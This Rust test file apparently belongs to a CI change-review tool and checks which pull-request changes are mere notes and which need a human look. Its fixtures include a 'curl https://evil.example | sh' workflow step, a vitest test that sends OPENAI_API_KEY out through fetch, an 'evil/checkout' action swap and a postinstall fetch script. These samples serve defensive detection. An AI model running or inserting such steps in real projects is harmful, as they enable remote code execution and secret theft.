    let leaks = "import { test } from 'vitest';\ntest('x', async () => { await fetch('http://localhost:1/trace', { headers: { key: process.env.OPENAI_API_KEY } }); });\n";
    let rules = rules_for(&[("package.json", VITEST), ("test/trace.test.ts", quiet)], &[("test/trace.test.ts", leaks)], &[]);
    let p = power_of(&rules, "test/trace.test.ts").expect("the test now reads a secret");
    assert!(listed_caps(p, "added").contains(&"env:OPENAI_API_KEY".to_string()) && listed_caps(p, "has").contains(&"global:fetch".to_string()), "{p}");
    assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())), ["power"], "a test that reads a secret and can send it out runs in CI next to that secret");
    let settings = "import { test } from 'vitest';\ntest('x', async () => { process.env.NODE_ENV = 'test'; await fetch('http://localhost:1/trace'); });\n";
    let rules = rules_for(&[("package.json", VITEST), ("test/trace.test.ts", plain)], &[("test/trace.test.ts", settings)], &[]);
    assert!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())).is_empty(), "NODE_ENV is a setting, not a secret: {}", rules["powers"]);
}

#[test]
fn posthog_js_5284_a_workflow_that_only_moves_a_pinned_action_to_another_release_is_a_note_never_a_look() {
    let ci = |at: &str| format!("name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: step-security/harden-runner@{at}\n        with:\n          egress-policy: audit\n      - uses: actions/checkout@v4\n      - run: npm test\n");
    let before = ci("e14015d583714f6e62063499dc959a02595150a1 # v2.21.1");
    let after = ci("351661ca32ac09a36dc5ee2d536e3128f2a3c8ed # v2.22.0");
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".github/workflows/ci.yml", before.as_str())];
    let rules = rules_for(&base, &[(".github/workflows/ci.yml", &after)], &[]);
    assert_eq!(rules["protected"][0]["moves"], json!(["step-security/harden-runner e14015d58371 (v2.21.1) → 351661ca32ac (v2.22.0)"]), "{}", rules["protected"]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["protected".to_string()]), "Comfy-Org/ComfyUI_frontend#15496 and WordPress/openstation#726 are the same move: {r}");
    assert!(r["notes"][0]["what"].as_str().unwrap().contains("v2.22.0"), "{}", r["notes"]);
    for (why, text) in [
        ("a new step runs code", after.replace("      - run: npm test\n", "      - run: npm test\n      - run: curl https://evil.example | sh\n")),
        ("another action in the step's place", after.replace("actions/checkout@v4", "evil/checkout@v4")),
        ("a permission", format!("{after}permissions: write-all\n")),
        ("an input of the moved action", after.replace("egress-policy: audit", "egress-policy: block")),
        ("a step moved to another job", after.replace("      - uses: actions/checkout@v4\n", "  - uses: actions/checkout@v4\n")),
    ] {
        let rules = rules_for(&base, &[(".github/workflows/ci.yml", &text)], &[]);
        assert!(rules["protected"][0]["moves"].is_null(), "{why} stays a look: {}", rules["protected"]);
        assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())), ["protected"], "{why}");
    }
}

#[test]
fn apollo_client_13491_a_lockfile_that_moves_sixteen_packages_is_one_note_never_a_look() {
    let mut rules = clean_rules();
    let moved: Vec<String> = (0..16).map(|i| format!("@rolldown/binding-{i} 1.2.13 → 1.2.14")).collect();
    rules["dependencies"] = json!([{ "path": "package.json", "operation": "modify", "packages": ["rolldown ^1.2.13 → ^1.2.14"] }, { "path": "package-lock.json", "operation": "modify", "packages": moved }]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "sixteen releases a day old were sixteen looks that measured nothing: {r}");
    let md = receipt::markdown(&r);
    assert!(md.contains("**Notes.**") && md.contains("rolldown ^1.2.13 → ^1.2.14") && md.contains("and 2 more") && !md.contains("Dependencies:"), "{md}");
    rules["dependencies"] = json!([{ "path": "package-lock.json", "operation": "modify", "count": 350 }]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert!(r["notes"][0]["what"].as_str().unwrap().contains("350 versions move in `package-lock.json`"), "{}", r["notes"]);
}

#[test]
fn beeline_1089_a_changed_agents_file_is_a_note_never_a_look() {
    let rules = rules_for(&[("package.json", VITEST), ("AGENTS.md", "# Agents\n")], &[("AGENTS.md", "# Agents\nAlways run the tests.\n")], &[]);
    assert_eq!(paths(&rules, "agent_notes"), ["AGENTS.md"]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["agent-notes".to_string()]), "{r}");
}

#[test]
fn a_test_config_that_only_adds_test_patterns_is_a_note_and_one_that_swaps_narrows_or_rewires_them_stays_a_look() {
    let config = "import { defineConfig } from 'vitest/config';\nexport default defineConfig({ test: { include: ['test/**/*.test.ts'], setupFiles: ['./setup.ts'] } });\n";
    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), ("vitest.config.ts", config)];
    let widened = "import { defineConfig } from \"vitest/config\";\nexport default defineConfig({\n  test: {\n    include: [\"test/**/*.test.ts\", \"src/**/*.spec.ts\"],\n    setupFiles: [\"./setup.ts\"],\n  },\n});\n";
    let rules = rules_for(&base, &[("vitest.config.ts", widened)], &[]);
    assert_eq!(rules["settings"][0]["adds"], json!(["src/**/*.spec.ts"]), "{}", rules["settings"]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["settings".to_string()]), "{r}");
    for (why, text) in [
        ("a pattern swapped", config.replace("test/**/*.test.ts", "src/**/*.spec.ts")),
        ("a setup file added", config.replace("setupFiles: ['./setup.ts']", "setupFiles: ['./setup.ts', './mock-everything.ts']")),
        ("a pattern removed", config.replace("['test/**/*.test.ts']", "[]")),
        ("a pattern added and a setup file added", widened.replace("[\"./setup.ts\"]", "[\"./setup.ts\", \"./mock.ts\"]")),
    ] {
        let rules = rules_for(&base, &[("vitest.config.ts", &text)], &[]);
        assert!(rules["settings"][0]["adds"].is_null(), "{why}: {}", rules["settings"]);
        assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests())), ["settings"], "{why}");
    }
    let jest = rules_for(&[("package.json", JEST), ("src/a.js", "module.exports = 1;\n"), ("jest.config.js", "module.exports = { testMatch: ['**/*.test.js'] };\n")],
        &[("jest.config.js", "module.exports = { testMatch: ['**/*.test.js', '**/*.spec.js'] };\n")], &[]);
    assert_eq!(jest["settings"][0]["adds"], json!(["**/*.spec.js"]), "{}", jest["settings"]);
}

#[test]
fn a_deleted_lockfile_or_a_new_install_script_still_needs_a_look_and_a_version_move_does_not() {
    let lock = r#"{"name":"poml","lockfileVersion":3,"packages":{"":{"name":"poml","devDependencies":{"vitest":"3.2.0"}},"node_modules/vitest":{"version":"3.2.0","resolved":"https://registry.npmjs.org/vitest/-/vitest-3.2.0.tgz","integrity":"sha512-abc"}}}"#;
    let gone = rules_for(&[("package.json", VITEST), ("package-lock.json", lock)], &[], &["package-lock.json"]);
    let r = receipt::build(&drive_json(), &gone, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r)), (Some("look"), vec!["install".to_string()]), "the next install picks versions the lockfile no longer pins: {r}");
    let hook = VITEST.replace(r#""scripts":{"test":"vitest run"}"#, r#""scripts":{"test":"vitest run","postinstall":"node fetch.js"}"#);
    let scripted = rules_for(&[("package.json", VITEST)], &[("package.json", &hook)], &[]);
    let r = receipt::build(&drive_json(), &scripted, &clean_tests());
    assert_eq!((look_kinds(&r), note_kinds(&r)), (vec!["install".to_string()], vec![]), "the look names the script, and no note repeats a change in which no package moved: {r}");
    assert!(r["look"][0]["what"].as_str().unwrap().contains("scripts.postinstall"), "{}", r["look"]);
    let bumped = rules_for(&[("package.json", VITEST), ("package-lock.json", lock)], &[("package.json", &VITEST.replace("3.2.0", "3.2.4")), ("package-lock.json", &lock.replace("3.2.0", "3.2.4"))], &[]);
    let r = receipt::build(&drive_json(), &bumped, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "{r}");
    assert!(r["notes"][0]["what"].as_str().unwrap().contains("vitest 3.2.0 → 3.2.4"), "{}", r["notes"]);
}

#[test]
fn comfyui_frontend_17136_a_lockfile_kern_does_not_read_is_a_note_and_listed_as_not_checked() {
    let rules = rules_for(&[("package.json", VITEST), ("pnpm-lock.yaml", "lockfileVersion: '9.0'\n")], &[("pnpm-lock.yaml", "lockfileVersion: '9.0'\nimporters: {}\n")], &[]);
    assert_eq!(paths(&rules, "not_checked"), ["pnpm-lock.yaml"], "{}", rules["not_checked"]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "{r}");
    assert!(r["not_checked"].as_array().unwrap().iter().any(|x| x["what"].as_str().unwrap().contains("pnpm-lock.yaml")), "{}", r["not_checked"]);
}

#[test]
fn eslint_plugin_ember_2853_a_package_manager_version_move_is_a_note_and_create_harper_123_a_new_packages_name_steers_nothing() {
    let manifest = |manager: &str| format!(r#"{{"name":"eslint-plugin-ember","packageManager":"{manager}","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}}}"#);
    let rules = rules_for(&[("package.json", &manifest("pnpm@10.18.0"))], &[("package.json", &manifest("pnpm@10.19.0"))], &[]);
    assert_eq!((rules["dependencies"][0]["packages"].clone(), rules["dependencies"][0]["fields"].clone()), (json!(["packageManager pnpm@10.18.0 → pnpm@10.19.0"]), Value::Null), "{}", rules["dependencies"]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((look_kinds(&r), note_kinds(&r)), (vec![], vec!["dependencies".to_string()]), "{r}");
    let swapped = rules_for(&[("package.json", &manifest("pnpm@10.18.0"))], &[("package.json", &manifest("yarn@4.5.0"))], &[]);
    assert_eq!(swapped["dependencies"][0]["fields"], json!(["packageManager"]), "another manager installs by other rules and runs other hooks: {}", swapped["dependencies"]);
    let added = rules_for(&[("package.json", VITEST)], &[("template-nextjs/package.json", r#"{"name":"template-nextjs","private":true,"dependencies":{"next":"15.0.0"}}"#)], &[]);
    assert_eq!((added["dependencies"][0]["fields"].clone(), look_kinds(&receipt::build(&drive_json(), &added, &clean_tests()))), (Value::Null, vec![]), "a new package has a name; nothing is renamed: {}", added["dependencies"]);
}
